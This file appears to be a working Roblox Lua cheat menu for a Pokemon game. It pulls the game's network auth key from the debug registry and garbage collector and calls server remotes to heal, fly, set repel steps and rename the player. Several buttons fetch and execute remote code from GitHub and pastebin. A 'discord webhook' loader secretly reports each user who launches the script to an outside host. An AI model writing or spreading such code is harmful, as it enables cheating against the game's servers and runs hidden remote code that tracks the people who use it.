
local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()

-- discord webhook ( when someone launched the script )
loadstring(game:HttpGet"https://raw.githubusercontent.com/discordxj2shn0001/aid/main/discord%20webhook")()

local UI = Material.Load({
     Title = "Pokemon Cheat Menu",
     Style = 3,
     SizeX = 250,
     SizeY = 330,
     Theme = "Mocha"
})

local Page = UI.New({
    Title = "Main"
})

Page.Button({
    Text = "Pokeball Magnet",
Callback = function()
local lp = game:service'Players'.LocalPlayer;
game:GetService("Workspace").chunk11["#Item"]:MoveTo(lp.Character.LeftHand.Position)
end
})

Page.Button({
    Text = "Heal",
Callback = function()
Get = game:GetService("ReplicatedStorage").GET
function GetMainData()
    for i, v in pairs(debug.getregistry()) do
        if typeof(v) == "function" then
            for a, b in pairs(debug.getupvalues(v)) do
                if typeof(b) == "table" and rawget(b, "Fishing") then
                    return b
                end
            end
        end
    end
end
Data = GetMainData()
AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
local key = game:GetService("UserInputService")
Get:InvokeServer(AuthKey, "PDS", "getPartyPokeBalls")
end
})


Page.Button({
    Text = "Fly",
Callback = function()
    -- https://raw.githubusercontent.com/discordxj2shn0001/aid/main/pbb%20fly
Get = game:GetService("ReplicatedStorage").GET
function GetMainData()
    for i, v in pairs(debug.getregistry()) do
        if typeof(v) == "function" then
            for a, b in pairs(debug.getupvalues(v)) do
                if typeof(b) == "table" and rawget(b, "Fishing") then
                    return b
                end
            end
        end
    end
end
Data = GetMainData()
AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
local SF = {}
SF["Fly"] = Data["Menu"]["map"]["fly"]
SF["Fly"](unpack(SF))
end
})


Page.Button({
    Text = "Unstuck",
Callback = function()
local _p = nil
        for _, v in pairs(getgc(true)) do
           if typeof(v) == "table" then
               if rawget(v, "PlayerData") then
                   _p = v
                   break
               end
           end
        end
        _p.Menu.options:getUnstuck(true)
        
end
})


Page.Toggle({
    Text = "Repel",
    Callback = function(value)
       local _p = nil
        for _, v in pairs(getgc(true)) do
           if typeof(v) == "table" then
               if rawget(v, "PlayerData") then
                   _p = v
                   break
               end
           end
        end
        if(value) then _p.Repel.steps = 1000000
        else
        _p.Repel.steps = 0
    end
    Enabled = true
    end
})

local Page2 = UI.New({
    Title = "Misc"
})

Page2.TextField({
    Text = "Player Card Name",
    Callback = function(value)
        local _p = nil
        for _, v in pairs(getgc(true)) do
           if typeof(v) == "table" then
               if rawget(v, "PlayerData") then
                   _p = v
                   break
               end
           end
        end
        
    _p.Network:post('PDS', 'chooseName', value)
    
    end
})

Page2.Button({
    Text = "Rejoin",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
end
})


